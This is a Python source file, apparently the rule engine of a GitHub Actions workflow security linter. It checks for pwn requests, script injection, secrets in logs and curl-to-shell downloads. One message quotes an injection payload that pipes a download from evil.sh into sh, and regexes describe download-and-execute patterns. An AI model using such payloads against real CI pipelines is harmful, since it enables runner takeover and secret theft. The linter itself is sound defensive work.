"""The rule engine and every rule.

A rule is a function `(Ctx) -> Iterable[Hit]` registered with `@rule(id, severity, title)`. `lint_doc` runs
all enabled rules, applies `# workflowlint-ignore:` comments, and returns Findings sorted by line.
"""

from __future__ import annotations

import difflib
import re
from collections.abc import Callable, Iterable, Iterator
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import NamedTuple

from . import cron as cronmod
from .expr import CONTEXTS, FUNCTIONS, LITERALS, Expr, Token, dangerous, find_expressions, tokens
from .model import Doc, Job, Node, Step, logical_lines, load_doc, script_lines, walk_scalars
from .perms import effective, infer_needs
from .tables import (
    ARCHIVED_ACTIONS,
    EVENT_KEYS,
    EVENT_SUBKEYS,
    EVENTS,
    GITHUB_KEYS,
    JOB_KEYS,
    LATEST_LABELS,
    OUTSIDER_EVENTS,
    PERMISSION_SCOPES,
    RETIRED_ACTIONS,
    STEP_KEYS,
    WORKFLOW_KEYS,
)

SEVERITIES = ("error", "warning", "info")
_SEV_RANK = {"error": 0, "warning": 1, "info": 2}


@dataclass(frozen=True)
class RuleInfo:
    id: str
    severity: str
    title: str


RULES: dict[str, RuleInfo] = {}


@dataclass
class Finding:
    rule: str
    severity: str
    line: int
    message: str
    fix: str
    file: str = ""


class Hit(NamedTuple):
    line: int
    message: str
    fix: str
    severity: str | None = None
    anchor: int = 0  # a second line a `# workflowlint-ignore` comment may sit above (e.g. the step)


Loader = Callable[[str], "Doc | None"]


@dataclass
class Ctx:
    doc: Doc
    loader: Loader | None = None  # repo-relative path -> Doc, for local reusable workflows
    now: datetime = field(default_factory=lambda: datetime.now(timezone.utc))

    @property
    def events(self) -> dict[str, Node | None]:
        return self.doc.events


Check = Callable[[Ctx], Iterable[Hit]]
_CHECKS: list[tuple[str, Check]] = []


def rule(rule_id: str, severity: str, title: str) -> Callable[[Check], Check]:
    RULES[rule_id] = RuleInfo(rule_id, severity, title)

    def deco(fn: Check) -> Check:
        _CHECKS.append((rule_id, fn))
        return fn

    return deco


RULES["GHA1000"] = RuleInfo("GHA1000", "error", "file is not valid YAML")

_IGNORE = re.compile(r"#\s*workflowlint-ignore:\s*([A-Za-z0-9_,\s]+)")


def _ignored_ids(doc: Doc) -> dict[int, set[str]]:
    out: dict[int, set[str]] = {}
    for i, line in enumerate(doc.lines, 1):
        if "workflowlint-ignore" not in line:
            continue
        m = _IGNORE.search(line)
        if m:
            out[i] = {t.strip().upper() for t in re.split(r"[,\s]+", m.group(1)) if t.strip()}
    return out


def _suppressed(doc: Doc, ign: dict[int, set[str]], rule_id: str, *lines: int) -> bool:
    for ln in lines:
        if ln <= 0:
            continue
        if rule_id in ign.get(ln, ()) or "ALL" in ign.get(ln, ()):
            return True
        p = ln - 1
        while p >= 1 and doc.lines[p - 1].strip().startswith("#"):
            if rule_id in ign.get(p, ()) or "ALL" in ign.get(p, ()):
                return True
            p -= 1
    return False


def lint_doc(doc: Doc, loader: Loader | None = None, disabled: frozenset[str] = frozenset(),
             now: datetime | None = None) -> list[Finding]:
    out: list[Finding] = []
    ign = _ignored_ids(doc)
    if doc.error is not None:
        if "GHA1000" not in disabled:
            out.append(Finding("GHA1000", "error", doc.error.line, f"invalid YAML: {doc.error.message}",
                               "Fix the syntax at this line; nothing else can be checked until the file parses.",
                               doc.path))
        return out
    ctx = Ctx(doc, loader, now or datetime.now(timezone.utc))
    for rid, fn in _CHECKS:
        if rid in disabled:
            continue
        info = RULES[rid]
        for h in fn(ctx):
            if _suppressed(doc, ign, rid, h.line, h.anchor):
                continue
            out.append(Finding(rid, h.severity or info.severity, h.line, h.message, h.fix, doc.path))
    out.sort(key=lambda f: (f.line, f.rule, f.message))
    return out


def lint_text(path: str, text: str, loader: Loader | None = None,
              disabled: frozenset[str] = frozenset()) -> list[Finding]:
    return lint_doc(load_doc(path, text), loader, disabled)


# ---------------------------------------------------------------------------------------------------------
# helpers


def suggest(word: str, options: Iterable[str], cutoff: float = 0.7) -> str | None:
    opts = list(options)
    if len(opts) > 200 or len(word) > 60:  # difflib is quadratic: only suggest for small inputs
        return None
    m = difflib.get_close_matches(word.lower(), [o.lower() for o in opts], n=1, cutoff=cutoff)
    if not m:
        return None
    for o in opts:
        if o.lower() == m[0]:
            return o
    return None


def scalar_exprs(doc: Doc, node: Node, key: str) -> Iterator[tuple[Expr, int, str]]:
    """Expressions in a scalar with the file line each starts on. Yields (expr, line, full text)."""
    if node.kind != "scalar" or not node.text:
        return
    if node.style in ("|", ">"):
        sl = script_lines(node, doc.lines)
        text = "\n".join(s.text for s in sl)
        starts: list[int] = []
        pos = 0
        for s in sl:
            starts.append(pos)
            pos += len(s.text) + 1

        def line_of(off: int) -> int:
            lo, hi = 0, len(starts) - 1
            while lo < hi:
                mid = (lo + hi + 1) // 2
                if starts[mid] <= off:
                    lo = mid
                else:
                    hi = mid - 1
            return sl[lo].line if sl else node.line
    else:
        text = node.text

        def line_of(off: int) -> int:
            return node.line + text.count("\n", 0, off)
    if key == "if" and "${{" not in text and text.strip():
        yield Expr(0, len(text), text, True), line_of(0), text
        return
    for e in find_expressions(text):
        yield e, line_of(e.start), text


_SHELL_PWSH = ("pwsh", "powershell")


def _step_shell(job: Job | None, step: Step) -> str:
    sh = step.shell or (job.default_shell() if job else None)
    if sh:
        return sh.split()[0].lower()
    if job is not None and any("windows" in lab.lower() for lab in job.runs_on_labels()):
        return "pwsh"
    return "bash"


def env_name(parts: list[str]) -> str:
    low = [p.lower() for p in parts]
    if low[:2] == ["github", "event"]:
        low = low[2:]
    elif low[:1] == ["github"]:
        low = low[1:]
    if low[:1] == ["inputs"]:
        low = ["input"] + low[1:]
    if low[:1] == ["pull_request"]:
        low = ["pr"] + low[1:]
    name = "_".join(p for p in low if p != "*")
    name = re.sub(r"[^A-Za-z0-9_]", "_", name).upper().strip("_")
    return name or "VALUE"


def _desc(parts: list[str]) -> str:
    d = ".".join(parts)
    if parts[:1] == ["inputs"] or parts[:3] == ["github", "event", "inputs"]:
        return f"`{d}` (a value whoever starts the run types)"
    if d.lower() in ("github.head_ref", "github.ref_name"):
        return f"`{d}` (a branch or tag name, which can contain shell syntax)"
    return f"`{d}` (text written by whoever opens the issue/PR/comment/commit)"


def _checkout_steps(job: Job) -> list[tuple[int, Step]]:
    return [(i, s) for i, s in enumerate(job.steps) if s.action() == "actions/checkout"]


# ---------------------------------------------------------------------------------------------------------
# GHA1001 pinning

_SHA = re.compile(r"[0-9a-fA-F]{40}\Z|[0-9a-f]{64}\Z")
_VERSIONISH = re.compile(r"v?\d+(?:\.\d+){0,3}(?:[-+.][0-9A-Za-z.\-]+)?\Z")
OFFICIAL_OWNERS = ("actions", "github")


def split_uses(uses: str) -> tuple[str, str] | None:
    if uses.startswith(("./", "../", "docker://")) or "${{" in uses or "@" not in uses:
        return None
    name, ref = uses.rsplit("@", 1)
    return name, ref


def pin_severity(name: str, ref: str) -> tuple[str, str] | None:
    """(severity, kind) when `name@ref` is not pinned to a commit, else None."""
    if _SHA.match(ref):
        return None
    official = name.split("/")[0].lower() in OFFICIAL_OWNERS
    tag = bool(_VERSIONISH.match(ref))
    if official:
        return ("info", "tag") if tag else ("warning", "branch")
    return ("warning", "tag") if tag else ("error", "branch")


def _all_uses(doc: Doc) -> Iterator[tuple[str, Node, int]]:
    for j in doc.jobs:
        if j.uses_node is not None and j.uses:
            yield j.uses, j.uses_node, j.uses_node.line
    for _, s in doc.all_steps():
        if s.uses_node is not None and s.uses:
            yield s.uses, s.uses_node, s.uses_node.line


@rule("GHA1001", "warning", "action is not pinned to a full commit SHA")
def r_pinning(ctx: Ctx) -> Iterable[Hit]:
    for uses, node, line in _all_uses(ctx.doc):
        if uses.startswith("docker://"):
            if "@sha256:" not in uses:
                yield Hit(line, f"`{uses}` is a container image pinned by tag, not by digest",
                          "Pin the image: docker://image@sha256:<digest> (docker buildx imagetools inspect <image>).")
            continue
        if "${{" in uses:
            continue
        if not uses.startswith(("./", "../")) and "@" not in uses:
            yield Hit(line, f"`{uses}` has no @version; GitHub rejects it", "Add @<full commit SHA>.", "error")
            continue
        sp = split_uses(uses)
        if sp is None:
            continue
        name, ref = sp
        res = pin_severity(name, ref)
        if res is None:
            continue
        sev, kind = res
        who = "an official action" if name.split("/")[0].lower() in OFFICIAL_OWNERS else "a third-party action"
        why = ("a branch moves on every push, so you run whatever its maintainer (or an attacker with their "
               "credentials) pushes next" if kind == "branch" else
               "tags can be re-pointed after the fact (the tj-actions/changed-files compromise rewrote tags)")
        yield Hit(line, f"`{uses}` is {who} referenced by {kind} `{ref}`; {why}",
                  f"Pin to the commit SHA: `uses: {name}@<40-hex> # {ref}`. The pin_actions_plan tool looks it up.",
                  sev)


# ---------------------------------------------------------------------------------------------------------
# GHA1002 pwn request

_UNTRUSTED_REF_PREFIXES = (
    "github.event.pull_request.head", "github.head_ref", "github.event.workflow_run.head",
    "github.event.pull_request.merge_commit_sha", "github.event.pull_request.number", "github.event.number",
    "github.event.workflow_run.pull_requests", "github.event.pull_request.base.repo.fork",
)


def _untrusted_ref(text: str) -> bool:
    if "refs/pull/" in text or "refs/remotes/pull/" in text:
        return True
    for e in find_expressions(text):
        for t in tokens(e.body):
            d = t.dotted.lower().replace(".*", "")
            if any(d.startswith(p) for p in _UNTRUSTED_REF_PREFIXES):
                return True
    return False


@rule("GHA1002", "error", "privileged trigger checks out and runs untrusted pull request code")
def r_pwn_request(ctx: Ctx) -> Iterable[Hit]:
    risky = [e for e in ("pull_request_target", "workflow_run") if e in ctx.events]
    if not risky:
        return
    trig = "/".join(risky)
    for job in ctx.doc.jobs:
        n_steps = len(job.steps)
        exec_after = [False] * (n_steps + 1)  # exec_after[i]: some step at index >= i runs code
        for k in range(n_steps - 1, -1, -1):
            exec_after[k] = exec_after[k + 1] or job.steps[k].run_node is not None or bool(job.steps[k].uses)
        for i, step in _checkout_steps(job):
            for key in ("ref", "repository"):
                node = step.with_get(key)
                if node is None or node.string() is None or not _untrusted_ref(node.text):
                    continue
                later = exec_after[i + 1]
                sev = "error" if later else "warning"
                run_note = ("and later steps run in that checkout (build scripts, package installs and tests all "
                            "execute attacker code)" if later else "(no later step runs it yet, but the token is "
                            "persisted in .git/config)")
                yield Hit(
                    node.line,
                    f"`{trig}` runs with the base repository's secrets and a write token, and this checkout "
                    f"fetches the untrusted pull request {key} `{node.text.strip()}` {run_note}: the classic "
                    "pwn request",
                    "Use the `pull_request` trigger for anything that builds or tests PR code. If you need "
                    "`pull_request_target` (labeling, commenting), do not check out the PR head. If you must, "
                    "split it in two workflows: an unprivileged `pull_request` workflow uploads results as an "
                    "artifact, and a `workflow_run` workflow only reads that data.",
                    sev, step.line)
        for step in job.steps:
            if step.run_node is None:
                continue
            for ln, text in logical_lines(script_lines(step.run_node, ctx.doc.lines)):
                if re.search(r"\bgh\s+pr\s+checkout\b", text) or (
                        re.search(r"\bgit\s+(checkout|fetch|switch|merge|pull|cherry-pick)\b", text)
                        and _untrusted_ref(text)):
                    yield Hit(ln, f"`{trig}` workflow checks out pull request code from the shell; later commands "
                              "run attacker-controlled files with secrets available",
                              "Do not fetch the PR head in a privileged workflow; use `pull_request` instead.",
                              "error", step.line)
        if "workflow_run" in ctx.events:
            for step in job.steps:
                if step.action() == "actions/download-artifact" and (
                        step.with_get("run-id") is not None or step.with_get("github-token") is not None):
                    yield Hit(step.line, "this `workflow_run` job downloads an artifact produced by another run, "
                              "which may be a fork's pull request: treat its contents as untrusted input",
                              "Never execute, source or `eval` anything from the artifact, and validate any value "
                              "read from it (e.g. a PR number must match ^[0-9]+$).", "warning")


# ---------------------------------------------------------------------------------------------------------
# GHA1003 script injection


def _script_targets(ctx: Ctx) -> Iterator[tuple[Job | None, Step, Node, str]]:
    for job, step in ctx.doc.all_steps():
        if step.run_node is not None:
            yield job, step, step.run_node, "run"
        elif step.action() == "actions/github-script":
            script = step.with_get("script")
            if script is not None:
                yield job, step, script, "script"


@rule("GHA1003", "error", "untrusted expression expanded inside a script (script injection)")
def r_injection(ctx: Ctx) -> Iterable[Hit]:
    seen: set[tuple[int, str]] = set()
    for job, step, node, kind in _script_targets(ctx):
        for e, line, _text in scalar_exprs(ctx.doc, node, "run"):
            for t in tokens(e.body):
                sev = dangerous(t)
                if sev is None or (line, t.dotted) in seen:
                    continue
                seen.add((line, t.dotted))
                name = env_name(t.parts)
                where = "the shell script" if kind == "run" else "the JavaScript source"
                use = ('"${%s}"' % name) if kind == "run" else f"process.env.{name}"
                if kind == "run" and _step_shell(job, step) in _SHELL_PWSH:
                    use = "$env:" + name
                yield Hit(
                    line,
                    f"{_desc(t.parts)} is expanded by GitHub into {where} before it runs, so a crafted value "
                    "such as `\"; curl evil.sh | sh #` becomes code",
                    f"Pass it as an environment variable and read it as data: `env: {name}: ${{{{ {t.dotted} }}}}` "
                    f"on the step, then use {use}.",
                    sev, step.line)


# ---------------------------------------------------------------------------------------------------------
# GHA1004 / GHA1005 permissions


@rule("GHA1004", "warning", "no `permissions:` key, so the token gets the repository default (often write)")
def r_perms_missing(ctx: Ctx) -> Iterable[Hit]:
    doc = ctx.doc
    if doc.kind != "workflow" or doc.get("permissions") is not None or doc.jobs_node is None:
        return
    lacking = [j for j in doc.jobs if j.permissions is None]
    if not lacking:
        return
    names = ", ".join(j.id for j in lacking[:6]) + (" ..." if len(lacking) > 6 else "")
    yield Hit(doc.jobs_node.key_line,
              f"no workflow-level `permissions:` and these jobs set none: {names}. GITHUB_TOKEN then gets the "
              "repository/organization default, which is read-write on many repositories",
              "Add `permissions: {contents: read}` at the top level, then grant extra scopes per job only where "
              "needed (see permissions_review).")


@rule("GHA1005", "error", "permissions: write-all")
def r_write_all(ctx: Ctx) -> Iterable[Hit]:
    nodes = [("workflow", ctx.doc.get("permissions"))] + [(f"job {j.id}", j.permissions) for j in ctx.doc.jobs]
    for who, n in nodes:
        if n is not None and n.is_scalar and n.text.strip() == "write-all":
            yield Hit(n.line, f"{who} grants every GITHUB_TOKEN scope write access (`write-all`)",
                      "List only the scopes this needs, e.g. `permissions: {contents: read}`.")


# ---------------------------------------------------------------------------------------------------------
# GHA1006 secrets: inherit


@rule("GHA1006", "warning", "`secrets: inherit` hands every secret to the called workflow")
def r_secrets_inherit(ctx: Ctx) -> Iterable[Hit]:
    for j in ctx.doc.jobs:
        s = j.node.get("secrets")
        if j.uses and s is not None and s.is_scalar and s.text.strip() == "inherit":
            yield Hit(s.line, f"job `{j.id}` passes all secrets to `{j.uses}`",
                      "Pass only what the callee needs: `secrets: {NAME: ${{ secrets.NAME }}}`.")


# ---------------------------------------------------------------------------------------------------------
# GHA1007 secrets echoed / on the command line

_ECHO = {"echo", "printf", "cat", "tee", "print", "write-host", "write-output", "out-file", "set-content"}


@rule("GHA1007", "warning", "secret printed or interpolated into a command line")
def r_secret_cmd(ctx: Ctx) -> Iterable[Hit]:
    for _job, step in ctx.doc.all_steps():
        if step.run_node is None:
            continue
        done: set[int] = set()
        for ln, text in logical_lines(script_lines(step.run_node, ctx.doc.lines)):
            for e in find_expressions(text):
                names = [t.parts[1] if len(t.parts) > 1 else "*" for t in tokens(e.body)
                         if t.parts[0].lower() == "secrets"]
                if not names or ln in done:
                    continue
                before = text[:e.start]
                if before.rstrip().endswith("::add-mask::") or before.endswith("::add-mask::"):
                    continue
                done.add(ln)
                seg = re.split(r"&&|\|\||;", before)[-1].strip()
                seg = re.sub(r"^(then|do|else)\s+", "", seg)
                words = seg.replace('"', " ").split()
                first = words[0].lower() if words else ""
                if first == "sudo" and len(words) > 1:
                    first = words[1].lower()
                after = text[e.end:]
                var = f"secrets.{names[0]}"
                if first in _ECHO and not re.search(r"\||>", after):
                    yield Hit(ln, f"`{var}` is printed with `{first}`; masking is best-effort (it misses encoded "
                              "or split values), so the secret can leak into logs",
                              "Never print secrets. If you only need to confirm it is set, test `[ -n \"$NAME\" ]` "
                              "with the value supplied through `env:`.", "error", step.line)
                else:
                    yield Hit(ln, f"`{var}` is pasted into the command text; it appears in the expanded script, "
                              "in `ps` output of the called program, and breaks if the value contains quotes",
                              f"Supply it through `env:` (`{names[0]}: ${{{{ {var} }}}}`) and reference "
                              f"\"${names[0]}\" in the script.", None, step.line)


# ---------------------------------------------------------------------------------------------------------
# GHA1008 curl | bash

_DL = re.compile(r"\b(curl|wget|irm|iwr|Invoke-WebRequest|Invoke-RestMethod)\b")
_INTERP = re.compile(r"(?:sudo(?:\s+-\S+)*\s+)?(?:(?:ba|z|da|k)?sh|python3?|perl|ruby|node|iex|Invoke-Expression)\b")
_SUBST = re.compile(r"(?:<\(|\$\()\s*(?:curl|wget)\b")
_SOURCERS = re.compile(r"\b(?:(?:ba|z|da|k)?sh(?:\s+-[a-z]+)*|source|eval|\.)\s*\"?$")


@rule("GHA1008", "warning", "downloads and executes a script in one step (curl | bash)")
def r_curl_bash(ctx: Ctx) -> Iterable[Hit]:
    for _job, step in ctx.doc.all_steps():
        if step.run_node is None:
            continue
        for ln, text in logical_lines(script_lines(step.run_node, ctx.doc.lines)):
            text = text[:8000]
            hit = False
            parts = re.split(r"(\|\||\|)", text)
            for i in range(0, len(parts) - 2, 2):
                if parts[i + 1] == "|" and _DL.search(parts[i]) and _INTERP.match(parts[i + 2].strip()):
                    hit = True
            if not hit:
                for m in _SUBST.finditer(text):
                    if _SOURCERS.search(text[:m.start()]):
                        hit = True
                        break
            if hit:
                yield Hit(ln, "a script is downloaded and piped straight into an interpreter; whoever controls the "
                          "URL (or a compromised CDN) controls your runner and its secrets",
                          "Download to a file, verify a pinned checksum (`sha256sum -c`), then run it; or use a "
                          "pinned setup action / package manager instead.", None, step.line)


# ---------------------------------------------------------------------------------------------------------
# GHA1009 persist-credentials

_NEEDS_CREDS_RUN = re.compile(r"\bgit\s+(push|fetch|pull|ls-remote|submodule|remote\s+update)\b|\bgh\s+\w+|"
                              r"\bsemantic-release\b|\bchangesets?\b")
_CRED_ACTIONS = ("peter-evans/create-pull-request", "ad-m/github-push-action", "endbug/add-and-commit",
                 "stefanzweig/", "jamesives/github-pages-deploy-action", "peaceiris/actions-gh-pages",
                 "googleapis/release-please-action", "changesets/action", "actions-js/push",
                 "stefan-zweig/", "mikepenz/", "softprops/action-gh-release", "actions/create-github-app-token")


def _uploads_workspace(step: Step) -> bool:
    """True when an upload-artifact step may include the checkout's .git directory (path is the workspace
    root, a bare glob, a .git path, or unknown)."""
    p = step.with_get("path")
    if p is None or not p.is_scalar or not p.text.strip() or "${{" in p.text:
        return True
    for raw in p.text.split("\n"):
        item = raw.strip().lstrip("!")
        if item in ("", ".", "./", "*", "**", "**/*", "/", "~", "./*") or item.startswith((".git", "./.git", "**/.git")):
            return True
    return False


@rule("GHA1009", "warning", "checkout leaves the token in .git/config while later steps run other code")
def r_persist_credentials(ctx: Ctx) -> Iterable[Hit]:
    for job in ctx.doc.jobs:
        n_steps = len(job.steps)
        creds_after = [False] * (n_steps + 1)
        upload_after = [False] * (n_steps + 1)
        third_after: list[Step | None] = [None] * (n_steps + 1)
        for k in range(n_steps - 1, -1, -1):
            s_ = job.steps[k]
            act = s_.action() or ""
            needs = s_.run_node is not None and any(
                _NEEDS_CREDS_RUN.search(t) for _, t in logical_lines(script_lines(s_.run_node, ctx.doc.lines)))
            needs = needs or (bool(act) and any(act.startswith(a) for a in _CRED_ACTIONS))
            creds_after[k] = creds_after[k + 1] or needs
            upload_after[k] = upload_after[k + 1] or (act == "actions/upload-artifact" and _uploads_workspace(s_))
            third_after[k] = s_ if (act and act.split("/")[0] not in OFFICIAL_OWNERS) else third_after[k + 1]
        for i, step in _checkout_steps(job):
            pc = step.with_get("persist-credentials")
            if pc is not None and pc.is_false():
                continue
            if step.with_get("token") is not None or step.with_get("ssh-key") is not None:
                continue
            if creds_after[i + 1]:
                continue
            third = third_after[i + 1]
            if upload_after[i + 1]:
                yield Hit(step.line, "checkout stores the GITHUB_TOKEN in .git/config and a later step uploads "
                          "artifacts; if the upload includes the workspace (path: . or **), the token ships with it "
                          "(\"artipacked\")",
                          "Add `with: {persist-credentials: false}` to this checkout.", "warning")
            elif third is not None:
                yield Hit(step.line, f"checkout stores the GITHUB_TOKEN in .git/config and a later third-party "
                          f"action (`{third.uses}`) can read it",
                          "Add `with: {persist-credentials: false}` to this checkout (nothing later needs git "
                          "credentials).", "info")


# ---------------------------------------------------------------------------------------------------------
# GHA1010 self-hosted


@rule("GHA1010", "warning", "self-hosted runner reachable from pull requests or other outsider events")
def r_self_hosted(ctx: Ctx) -> Iterable[Hit]:
    out_events = sorted(e for e in ctx.events if e in OUTSIDER_EVENTS)
    if not out_events:
        return
    for j in ctx.doc.jobs:
        if "self-hosted" in [lab.lower() for lab in j.runs_on_labels()] and j.runs_on is not None:
            yield Hit(j.runs_on.line, f"job `{j.id}` runs on a self-hosted runner and the workflow triggers on "
                      f"{', '.join(out_events)}. On a public repository anyone can open a PR that runs code on "
                      "your machine, and self-hosted runners are not wiped between jobs",
                      "Use GitHub-hosted runners for outsider-triggered workflows, require approval for outside "
                      "contributors, or use ephemeral just-in-time runners in an isolated network.")


# ---------------------------------------------------------------------------------------------------------
# GHA1011 / GHA1012 deprecated commands

_DEPRECATED = (
    (re.compile(r"::set-output\b"), "set-output", "warning", "echo \"name=value\" >> \"$GITHUB_OUTPUT\""),
    (re.compile(r"::save-state\b"), "save-state", "warning", "echo \"name=value\" >> \"$GITHUB_STATE\""),
    (re.compile(r"::set-env\b"), "set-env", "error", "echo \"NAME=value\" >> \"$GITHUB_ENV\""),
    (re.compile(r"::add-path::"), "add-path", "error", "echo \"/new/dir\" >> \"$GITHUB_PATH\""),
)


@rule("GHA1011", "warning", "deprecated workflow command")
def r_deprecated(ctx: Ctx) -> Iterable[Hit]:
    for _job, step in ctx.doc.all_steps():
        if step.run_node is None:
            continue
        for ln, text in logical_lines(script_lines(step.run_node, ctx.doc.lines)):
            if text.lstrip().startswith("#"):
                continue
            for rx, name, sev, repl in _DEPRECATED:
                if rx.search(text):
                    state = "disabled and fails" if sev == "error" else "deprecated and prints warnings"
                    yield Hit(ln, f"`::{name}` is {state}", f"Write to the environment file instead: `{repl}`.",
                              sev, step.line)


@rule("GHA1012", "error", "ACTIONS_ALLOW_UNSECURE_COMMANDS re-enables disabled workflow commands")
def r_unsecure(ctx: Ctx) -> Iterable[Hit]:
    envs: list[Node | None] = [ctx.doc.get("env")] + [j.env for j in ctx.doc.jobs] + [
        s.env for _, s in ctx.doc.all_steps()]
    for env in envs:
        if env is None or not env.is_map:
            continue
        for k, v in env.items.items():
            if k.upper() == "ACTIONS_ALLOW_UNSECURE_COMMANDS" and not v.is_false():
                yield Hit(v.key_line, "this turns `set-env`/`add-path` back on; both allow log text to modify the "
                          "environment (injection)", "Delete it and migrate to $GITHUB_ENV / $GITHUB_PATH.")


# ---------------------------------------------------------------------------------------------------------
# GHA1013 / GHA1014


@rule("GHA1013", "info", "job has no timeout-minutes (default is 360)")
def r_timeout(ctx: Ctx) -> Iterable[Hit]:
    for j in ctx.doc.jobs:
        if j.uses is None and j.timeout is None:
            yield Hit(j.line, f"job `{j.id}` can run for up to 6 hours if it hangs", "Add `timeout-minutes: 15` (or "
                      "a bound that is a little above the normal duration).")


_DEPLOYISH = re.compile(r"(^|[-_ ])(deploy|release|publish)(?=$|[-_ ])", re.I)


@rule("GHA1014", "info", "deploy-like job without a concurrency group")
def r_concurrency(ctx: Ctx) -> Iterable[Hit]:
    if ctx.doc.get("concurrency") is not None:
        return
    for j in ctx.doc.jobs:
        if j.concurrency is not None or j.uses is not None:
            continue
        deployish = bool(_DEPLOYISH.search(j.id) or _DEPLOYISH.search(j.name) or j.environment is not None or any(
            s.action() in ("actions/deploy-pages", "pypa/gh-action-pypi-publish") for s in j.steps))
        if deployish:
            yield Hit(j.line, f"job `{j.id}` looks like a deployment but nothing stops two runs from deploying at "
                      "the same time",
                      "Add `concurrency: {group: deploy-${{ github.ref }}, cancel-in-progress: false}`.")


# ---------------------------------------------------------------------------------------------------------
# GHA1015 / GHA1016 needs


@rule("GHA1015", "error", "`needs:` names a job that does not exist")
def r_needs_unknown(ctx: Ctx) -> Iterable[Hit]:
    ids = [j.id for j in ctx.doc.jobs]
    known = set(ids)
    for j in ctx.doc.jobs:
        for n in j.needs:
            if n.text not in known:
                sg = suggest(n.text, ids, 0.6)
                yield Hit(n.line, f"job `{j.id}` needs `{n.text}`, which is not defined" + (
                    f" (did you mean `{sg}`?)" if sg else ""),
                    "Use an existing job id from the `jobs:` mapping.")


@rule("GHA1016", "error", "`needs:` forms a cycle")
def r_needs_cycle(ctx: Ctx) -> Iterable[Hit]:
    known = {x.id for x in ctx.doc.jobs}
    graph = {j.id: [n for n in j.needs if n.text in known] for j in ctx.doc.jobs}
    state: dict[str, int] = {}
    reported: set[frozenset[str]] = set()
    hits: list[Hit] = []
    for root in graph:
        if state.get(root) is not None:
            continue
        # iterative DFS: (job, index of the next dependency to look at)
        stack: list[tuple[str, int]] = [(root, 0)]
        state[root] = 1
        while stack:
            u, i = stack[-1]
            if i >= len(graph[u]):
                state[u] = 2
                stack.pop()
                continue
            stack[-1] = (u, i + 1)
            n = graph[u][i]
            v = n.text
            if state.get(v) == 1:
                path = [s for s, _ in stack]
                cyc = path[path.index(v):] + [v]
                key = frozenset(cyc)
                if key not in reported:
                    reported.add(key)
                    hits.append(Hit(n.line, "`needs:` cycle: " + " -> ".join(cyc) + "; GitHub refuses to run it",
                                    "Remove one of the dependencies so the graph has no loop."))
            elif state.get(v) is None:
                state[v] = 1
                stack.append((v, 0))
    return hits


# ---------------------------------------------------------------------------------------------------------
# GHA1017 if: pitfalls


@rule("GHA1017", "error", "`if:` condition that is always true or silently lost")
def r_if(ctx: Ctx) -> Iterable[Hit]:
    nodes: list[Node] = [j.if_node for j in ctx.doc.jobs if j.if_node is not None]
    nodes += [s.if_node for _, s in ctx.doc.all_steps() if s.if_node is not None]
    for n in nodes:
        if n.kind != "scalar":
            continue
        if n.tag.startswith("!"):
            yield Hit(n.line, f"the condition starts with `!`, which YAML reads as a tag (`{n.tag}`), not as "
                      "negation: the condition is discarded",
                      "Wrap it: `if: ${{ !contains(github.ref, 'x') }}` or quote the whole string.")
            continue
        t = n.text
        if n.style in ("|", ">") or "${{" not in t:
            continue
        exprs = find_expressions(t)
        rest = t
        for e in reversed(exprs):
            rest = rest[:e.start] + rest[e.end:]
        if rest.strip():
            yield Hit(n.line, "text around `${{ }}` turns the whole condition into a non-empty string, and a "
                      "non-empty string is always true",
                      "Put the entire expression inside one `${{ }}` (`if: ${{ a == 'b' }}`) or drop the braces.")


# ---------------------------------------------------------------------------------------------------------
# GHA1018 / GHA1019 contexts


def _walk_exprs(doc: Doc) -> Iterator[tuple[Expr, int, Token]]:
    if doc.root is None:
        return
    seen: set[tuple[int, str]] = set()
    for key, node in walk_scalars(doc.root):
        if not node.text:
            continue
        for e, line, _ in scalar_exprs(doc, node, key):
            for t in tokens(e.body):
                if (line, t.dotted) in seen:
                    continue
                seen.add((line, t.dotted))
                yield e, line, t


@rule("GHA1018", "error", "unknown context in an expression")
def r_unknown_context(ctx: Ctx) -> Iterable[Hit]:
    for _e, line, t in _walk_exprs(ctx.doc):
        root = t.parts[0].lower()
        if root in CONTEXTS or root in LITERALS or t.parts[0] in FUNCTIONS:
            continue
        sg = suggest(root, CONTEXTS, 0.6)
        yield Hit(line, f"`{t.parts[0]}` is not a GitHub Actions context" + (f" (did you mean `{sg}`?)" if sg else ""),
                  "Contexts are: " + ", ".join(CONTEXTS) + ". An unknown name evaluates to an empty string.")


@rule("GHA1019", "warning", "misspelled github / github.event property")
def r_misspelled(ctx: Ctx) -> Iterable[Hit]:
    for _e, line, t in _walk_exprs(ctx.doc):
        p = [x.lower() for x in t.parts]
        if p[0] != "github" or len(p) < 2:
            continue
        bad: tuple[str, str | None] | None = None
        if p[1] not in GITHUB_KEYS:
            sg = suggest(p[1], GITHUB_KEYS, 0.75)
            if sg:
                bad = (".".join(t.parts[:2]), "github." + sg)
        elif p[1] == "event" and len(p) >= 3 and p[2] != "*" and p[2] not in EVENT_KEYS:
            sg = suggest(p[2], EVENT_KEYS, 0.75)
            if sg:
                bad = (".".join(t.parts[:3]), "github.event." + sg)
        elif p[1] == "event" and len(p) >= 4 and p[2] in EVENT_SUBKEYS and p[3] != "*" and p[3] not in EVENT_SUBKEYS[p[2]]:
            sg = suggest(p[3], EVENT_SUBKEYS[p[2]], 0.75)
            if sg:
                bad = (".".join(t.parts[:4]), f"github.event.{p[2]}.{sg}")
        if bad:
            yield Hit(line, f"`{bad[0]}` is not a known property; it evaluates to an empty string",
                      f"Did you mean `{bad[1]}`? (The property table is partial: check the webhook payload docs "
                      "if you are sure it exists.)")


# ---------------------------------------------------------------------------------------------------------
# GHA1020 matrix


@rule("GHA1020", "error", "matrix is empty or larger than 256 jobs")
def r_matrix(ctx: Ctx) -> Iterable[Hit]:
    for j in ctx.doc.jobs:
        st = j.strategy
        m = st.get("matrix") if st is not None else None
        if m is None or not m.is_map:
            continue
        total = 1
        dims = 0
        for k, v in m.items.items():
            if k in ("include", "exclude"):
                continue
            if v.is_seq:
                dims += 1
                if not v.seq:
                    yield Hit(v.key_line, f"matrix dimension `{k}` is empty, so the job never runs and the "
                              "workflow fails validation", "Give it at least one value or remove it.")
                total *= max(len(v.seq), 1)
        if dims and total > 256:
            yield Hit(m.key_line, f"matrix expands to {total} jobs; GitHub allows at most 256 per workflow run",
                      "Split the matrix, drop dimensions, or use `exclude:` to prune combinations.")


# ---------------------------------------------------------------------------------------------------------
# GHA1021 latest runners


@rule("GHA1021", "info", "runner label tracks `latest`, which moves under you")
def r_runner_latest(ctx: Ctx) -> Iterable[Hit]:
    for j in ctx.doc.jobs:
        ro = j.runs_on
        if ro is None:
            continue
